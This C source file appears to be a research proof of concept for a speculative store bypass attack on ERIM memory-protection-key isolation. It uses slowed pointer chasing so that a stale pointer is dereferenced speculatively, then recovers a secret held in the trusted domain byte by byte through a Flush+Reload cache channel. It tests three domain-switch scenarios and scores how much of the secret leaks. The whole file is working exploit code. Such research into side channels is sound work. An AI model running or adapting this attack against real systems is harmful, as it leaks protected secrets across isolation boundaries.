#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <seccomp.h>
#include <linux/seccomp.h>

#include "spex.h"
#include "libcache/cacheutils.h"

// inaccessible (overwritten) secret
#define DATA "data|"
#define SECRET      "INACCESSIBLE SECRET"

char* secret;

int64_t* data;

#ifndef SCENARIO
  #define SCENARIO 2
#endif

char * create_secret() {
  // init isolation and sh mem
  if(erim_init(4096, ERIM_FLAG_ISOLATE_TRUSTED)) {
    exit(EXIT_FAILURE);
  }

  // scanmem for wrpkru
  if(erim_memScan(NULL, NULL, ERIM_UNTRUSTED_PKRU)) {
    exit(EXIT_FAILURE);
  }

  // allocate secret
  char* data = (char*)erim_malloc(sizeof(char) * 128);

  if(data == NULL) {
    printf("allocation of secret failed\n");
    exit(EXIT_FAILURE);
  }
  
  memcpy(data, SECRET, sizeof(SECRET));
  data[sizeof(SECRET)] = '0';
  Switch_U

  return data;
}

unsigned char * create_public() {
  unsigned char* public = malloc(sizeof(DATA)+1);

  if(public == NULL) {
    printf("allocation of public failed\n");
    exit(EXIT_FAILURE);
  }

  memcpy(public, DATA, sizeof(DATA));
  // ensure data terminates
  public[sizeof(DATA)] = 0;

  return public;
}

#if SCENARIO == 3
void dummy_func(char c){
  //... do nothing
}

__attribute__((aligned(4096))) void func(char c){
  cache_encode(c);
}
__attribute__((aligned(4096)))  __attribute__((used)) void offset_further_code(){}

#endif

#if SCENARIO == 3
void access_array(unsigned char* public, int64_t index, uint64_t f) {
#else
void access_array(unsigned char* public, int64_t index) {
#endif
    #if SCENARIO == 2 || SCENARIO == 3
      Switch_T
    #endif
    

    // flushing the data which is used in the condition increases
    // probability of speculation
    mfence();
    int64_t** data_slowptr = &data;
    int64_t*** data_slowslowptr = &data_slowptr;
    int x = 0;

    int64_t offset = 64 * 63 * 64 * 62;
    int64_t val1 = 64;
    int64_t val2 = 63;
    int64_t val3 = 62;
    int64_t validx = 0;
    int64_t vals[1];
    vals[0] = 64;

    data[0] = (int64_t)public + index;

    mfence();
  
    flush(&val1);
    flush(&val2);
    flush(&val3);
    flush(&vals);
    flush(&validx);

    flush(&x);
    flush(data_slowptr);
    flush(&data_slowptr);
    flush(data_slowslowptr);
    flush(&data_slowslowptr);
    // ensure data is flushed at this point
    mfence();


    // overwrite data via different pointer
    // pointer chasing makes this extremely slow
    offset /= val2;
    offset /= val1;
    offset /= vals[validx];
    offset /= val3;
    offset -= 1;

    // overwrite data via different pointer
    // pointer chasing makes this extremely slow
    data_slowslowptr+=offset;
    (*(*data_slowslowptr))[x] = (int64_t)public;
    // data[x] should now be "#"
    // uncomment next line to break attack
    //mfence();
    // Encode stale value in the cache

    #if SCENARIO == 2
      Switch_U
    #endif

#if SCENARIO == 3
    char c = ((char*)(data[x]))[x];
    if (c !=  'd'){
      ((void(*)(char c))f)(c);
    }
#else
    cache_encode(((char*)(data[x]))[x]);
#endif

    #if SCENARIO == 3
      Switch_U
    #endif
}



int main(int argc, const char **argv) {
  #if EXEC_PREV == 1
    setupTAndU(0,0, &func, &func);
  #endif

  data = malloc(128);
  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  //printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
  
  pagesize = sysconf(_SC_PAGESIZE);

  char *_mem = malloc(pagesize * (256 + 4));
  // page aligned
  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
  // initialize memory
  memset(mem, 0, pagesize * 256);

  // Flush our shared memory
  flush_shared_memory();

  unsigned char* secret_data = create_secret();
  unsigned char* public = create_public();
  long long offset = secret_data - public;

  // nothing leaked so far
  char leaked[sizeof(SECRET) + 1];
  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(SECRET)] = 0;

  #define MAXITER 50000
  // Switch for the whole attack to untrusted  
  #if SCENARIO == 1
    Switch_U
  #endif

  int j = 0;
  int c = 0;
  while(1 && c != MAXITER) {
    c++;
    // for every byte in the string
    j = (j + 1) % sizeof(SECRET);

    // Switch for speculativer access in victim to trusted
    #if SCENARIO == 2 || SCENARIO == 3
      Switch_T
    #endif 

    // overwrite value with X, then access

#if SCENARIO == 3
    access_array(public, j + offset, (uint64_t)func);
#else
    access_array(public, j + offset);
#endif

    mfence(); // avoid speculation
    // Recover data from covert channel
    cache_decode_pretty(leaked, j);

    if(!strncmp(leaked, SECRET, sizeof(SECRET) - 1))
      break;

    sched_yield();
  }
  //printf("\n\n[\x1b[32m>\x1b[0m] Done\n");
  Switch_T
  int score=0;
  for (int i = 0; i < sizeof(SECRET); i++){

    // Do not include the space!
    if (leaked[i] == secret_data[i] && i != 12){
      score++;
    }
  }

  printf("%d, %d, %d", SCENARIO, c, score);
  if (score > 0){
    printf(" <--\n");
  }else{
    printf("\n");
  }
  return EXIT_SUCCESS;
}